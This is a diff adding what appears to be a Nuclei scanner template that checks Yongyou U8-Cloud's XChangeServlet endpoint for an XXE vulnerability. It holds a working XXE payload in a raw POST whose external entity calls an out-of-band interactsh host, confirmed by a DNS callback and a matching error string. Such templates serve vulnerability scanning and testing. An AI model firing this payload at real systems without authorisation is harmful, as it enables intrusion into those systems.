@@ -1,0 +1,33 @@
+id: poc-yaml-yongyou-u8cloud-xchangeservlet-xxe
+info:
+  name: Yongyou U8-Cloud XChangeServlet XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+  description: |
+    This template checks for an XXE vulnerability in the Yongyou U8-Cloud XChangeServlet endpoint by leveraging DNS interactions for validation.
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /service/XChangeServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{reverse}}">]>
+        <r><a>&xxe;</a></r>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<resultdescription>"
+          - "从网络读取数据流出错"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
